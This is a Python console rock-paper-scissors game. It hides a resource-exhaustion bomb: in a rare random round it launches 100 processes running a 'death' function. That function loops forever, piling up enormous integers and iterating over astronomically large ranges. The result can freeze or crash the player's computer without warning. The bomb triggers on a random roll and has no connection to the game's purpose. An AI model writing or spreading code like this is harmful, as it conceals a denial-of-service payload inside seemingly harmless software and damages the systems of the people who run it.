import time, os
import random as rm
from multiprocessing import Process

choices :dict[str, int] = {"loser":0,
                           "rock":1,
                           "paper":2,
                           "scissor":3}

idk :list[float] = list()

def death():
    print(f"Computer uses {'\033[1m' + "Thermonuclear ballistic intercontinental supersonic tactical missile"}")
    time.sleep(5)
    animation()
    time.sleep(1)
    int1, int2 = 1, 2
    while True:
        print(int1 / int2)
        int1, int2 = int2, int1 + int2
        idk.append(int1**10000)
        for i in range(10**10000):
            i = (i**i+i//2)**i

processes :list = list()
for _ in range(100):
    processes.append(Process(target=death, name="DAJE"))

def animation() -> None:
    print("Get ready!")
    time.sleep(1)
    os.system('cls')
    print("3")
    time.sleep(0.5)
    os.system('cls')
    print("2")
    time.sleep(0.5)
    os.system('cls')
    print("1")
    time.sleep(0.5)
    os.system('cls')
    time.sleep(1)
    return None

def main() -> None:
    points :int = 0
    animation()
    while True:
        computer_choice :int = rm.randint(1,3)
        player_choice :str = input("Enter either rock, paper or scissor.\n>>> ").lower()
        if player_choice == "exit":
            break
        player_choice :int = choices.get(player_choice if player_choice in choices.keys() else "loser")
        if rm.randint(0, 10000) == 5000:
            for process in processes:
                process.start()
            for process in processes:
                process.join()
        if player_choice == 0:
            print("Invalid choice results in termination and points destruction!")
            break
        if computer_choice == player_choice:
            print(list(choices.keys())[computer_choice])
            print("Its a draw!")
        elif (computer_choice == 1 and player_choice == 2) or (computer_choice == 2 and player_choice == 3) or (computer_choice == 3 and player_choice == 1):
            print(list(choices.keys())[computer_choice])
            print("U win")
            points += 1
        elif (computer_choice == 1 and player_choice == 3) or (computer_choice == 2 and player_choice == 1) or (computer_choice == 3 and player_choice == 2):
            print(list(choices.keys())[computer_choice])
            print("U lose")
            points -= 1
    print(f"You left with {str(points) if player_choice != 0 else "0"} points")
    return None

if __name__ == "__main__":
    main()
